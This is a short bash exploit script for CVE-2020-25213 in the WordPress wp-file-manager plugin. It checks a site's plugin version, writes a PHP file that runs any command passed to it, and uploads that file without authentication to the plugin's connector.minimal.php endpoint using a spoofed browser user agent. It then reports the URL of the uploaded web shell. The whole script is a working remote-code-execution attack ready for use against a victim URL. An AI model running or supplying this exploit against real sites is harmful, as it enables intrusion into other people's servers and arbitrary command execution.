#!/bin/bash

if [ $# -eq 2 ]
then
	url_victim=$1
	version=$(curl -s "$url_victim/wp-content/plugins/wp-file-manager/readme.txt" | grep "== Changelog ==" -A 3 | grep "[0-9]" | awk '{print $2}' | tr -d '.')
	if [ $(($version)) -lt 69 ] # es decir si cualquier version sea menor a 6.9 es vulnerable
	then
		rm exploit_cve.php 2>/dev/null
		file_upload="$PWD/exploit_cve.php"
		command=$2
		echo "<?php echo system(\"$command\"); ?>" > exploit_cve.php

		target="$url_victim/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php"

		#response=$(curl -ks --max-time 5 -F \"requid=17457a1fe6959\" -F \"cmd=upload\" -F \"target=l1_Lw\" -F \"mtime[]=1576045135\" -F "upload[]=@/$file_upload" \"$target\")
		user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.90 Safari/537.36"
		response=$(curl -ks --max-time 5 --user-agent "$user_agent" -F "reqid=17457a1fe6959" -F "cmd=upload" -F "target=l1_Lw"  -F "mtime[]=1576045135" \
                -F "upload[]=@/$file_upload" \
                "$target" )

		file_upload_url=$(echo "$response" | jq -r .added[0].url 2>/dev/null)

		#echo "$response"

		if [ -n "$file_upload_url" ]
		then
			echo -e "[+] Se subio exitosamente, puedes verificarlo: $file_upload_url"
		else
			echo -e "[!] Algo salio mal..."
		fi
		rm exploit_cve.php 2>/dev/null
	else
		echo "[!] No es vulnerable"
	fi
else
	echo "[!] Usalo asi"
	echo -e "\t./cve_2020_25213.sh <url-victim_plugin> <command>"
	echo -e "<url-victim_plugin>: (ejemplo: http://127.0.0.1/wordpress)"
fi
